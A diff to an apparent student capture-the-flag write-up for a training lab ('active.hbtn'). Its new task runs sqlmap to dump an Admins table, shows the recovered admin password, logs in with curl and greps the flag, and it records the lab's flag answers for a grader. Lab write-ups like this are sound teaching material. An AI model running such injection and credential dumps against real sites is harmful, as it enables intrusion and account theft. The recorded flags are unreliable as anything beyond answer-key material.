@@ -412,7 +412,7 @@ Try to save them on local terminal and verify the result.
 echo 9e2150471de4c6b6d70c24a3b9d782de >101-flag.txt
 ```
 
-... and 100%
+... and the grader evaluates it to 100%
 
 
 ## Task 6 - admin login page > 5-hidden_dir.txt
@@ -478,5 +478,79 @@ echo "/admin" > 5-hidden_dir.txt
 cat 5-hidden_dir.txt
 ## /admin
 ## verify result with grader
+```
+
+## Task 7 - Third Flag > 102-flag.txt
+
+```bash
+# install again sqlmap
+apt update && apt install -y sqlmap
+
+# we remember from previous flag, we had
+# Database: active.hbtn
+# Tables: Admins, Orders, Products, Users
+# Let's have a look on table Admins
+sqlmap -u "http://active.hbtn/product/1" -D "active.hbtn" -T Admins --dump --batch --fresh-queries
+# Database: active.hbtn
+# Table: Admins
+# [1 entry]
+# +----+-------------------+--------------------+----------+
+# | id | email             | password           | username |
+# +----+-------------------+--------------------+----------+
+# | 1  | admin@active.hbtn | password1@ECXUJL49 | admin    |
+# +----+-------------------+--------------------+----------+
 
 
+# lets try to login with these credentials on the /admin page
+curl -i -s -L -c cookies.txt -b cookies.txt \
+  -X POST http://active.hbtn/admin \
+  --data-urlencode "username=admin" \
+  --data-urlencode "password=password1@ECXUJL49"
+# HTTP/1.1 302 FOUND
+# Server: nginx/1.18.0
+# Date: Tue, 16 Jun 2026 18:58:29 GMT
+# Content-Type: text/html; charset=utf-8
+# Content-Length: 211
+# Connection: keep-alive
+# Location: /admin_panel
+# Vary: Cookie
+# Set-Cookie: session=ko_SnKqGt3HzvjHpw5fVvM7_LLCzBl8NenGfc1wRvyI; Expires=Fri, 17 Jul 2026 18:58:29 GMT; HttpOnly; Path=/
+# 
+# HTTP/1.1 405 METHOD NOT ALLOWED
+# Server: nginx/1.18.0
+# Date: Tue, 16 Jun 2026 18:58:29 GMT
+# Content-Type: text/html; charset=utf-8
+# Content-Length: 153
+# Connection: keep-alive
+# Allow: OPTIONS, GET, HEAD
+# Set-Cookie: session=ko_SnKqGt3HzvjHpw5fVvM7_LLCzBl8NenGfc1wRvyI; Expires=Fri, 17 Jul 2026 18:58:29 GMT; HttpOnly; Path=/
+# Vary: Cookie
+# 
+# <!doctype html>
+# <html lang=en>
+# <title>405 Method Not Allowed</title>
+# <h1>Method Not Allowed</h1>
+# <p>The method is not allowed for the requested URL.</p>
+```
+
+Almost there. The last `curl` command accepted the login and we got a redirect (HTTP/1.1 302 FOUND) to Location: `/admin_panel`  \
+We're using `curl -L`, so curl tried to follow the redirect with `-X POST` method, but `/admin_panel` is not accepting the `POST` method, so we're getting `# HTTP/1.1 405 METHOD NOT ALLOWED` 
+
+The solution: use the saved cookie and visit `/admin_panel` with `GET` method (curl default).
+
+```bash
+# get the /admin_panel and try to grep the flag
+curl -s -b cookies.txt http://active.hbtn/admin_panel | grep "Holberton Sec Lab"
+#        <h1 style="color: black;">Holberton Sec Lab - 06e22b6de6eec67f9e38f779ff7c6545</h1>
+```
+
+Save the flag on a local terminal
+
+```bash
+# repo local terminal
+echo 06e22b6de6eec67f9e38f779ff7c6545 > 102-flag.txt
+cat 102-flag.txt
+# 06e22b6de6eec67f9e38f779ff7c6545
+```
+
+Commit, push & verify with the grader.
